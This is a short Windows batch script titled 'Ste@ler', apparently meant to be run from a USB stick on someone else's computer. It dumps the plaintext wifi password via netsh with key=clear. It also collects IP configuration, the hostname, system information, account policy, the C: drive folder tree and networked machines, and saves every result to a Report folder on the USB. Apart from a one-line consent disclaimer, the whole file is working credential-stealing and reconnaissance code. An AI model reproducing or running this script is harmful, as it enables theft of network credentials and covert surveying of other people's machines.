echo off
cls
title Ste@ler
color 0A
echo ©Vitag, All Rights Reserved.
set /p nouvelle_variable="Enter the letter of your usb key (d,e,f...) : "
cd %nouvelle_variable%:\
md Report
set /p wifipassword="Enter the name of the wifi to which you are connected : "
cls
echo I am not responsible for your actions, in any case.Use my software only on computers that you have the owner's agreement.Thank you for trusting me using my software.
echo Press [ENTER] for start the program.
pause >nul
echo Working...
ipconfig >%nouvelle_variable%:\Report\ipconfig.txt
echo -ip: OK
ipconfig /all >%nouvelle_variable%:\Report\ipconfigall.txt
echo -all ips: OK
hostname >%nouvelle_variable%:\Report\hostname.txt
echo -hostname: OK
netsh wlan show profile name=%wifipassword% key=clear >%nouvelle_variable%:\Report\wifipassword.txt
echo -wifi password : OK
net accounts >%nouvelle_variable%:\Report\netaccounts.txt
echo -windows accounts: OK
ver >%nouvelle_variable%:\Report\versionwindows.txt
echo -version of windows: OK
systeminfo >%nouvelle_variable%:\Report\systeminfo.txt
echo -system information: OK
tree C: >%nouvelle_variable%:\Report\treeC.txt
echo -organization folders: OK
net view >%nouvelle_variable%:\Report\netview.txt
echo -computer on the network: OK
cls
echo Wait 5 seconds, the program will close by itself.
timeout /T 05 /NOBREAK
echo See you soon.
exit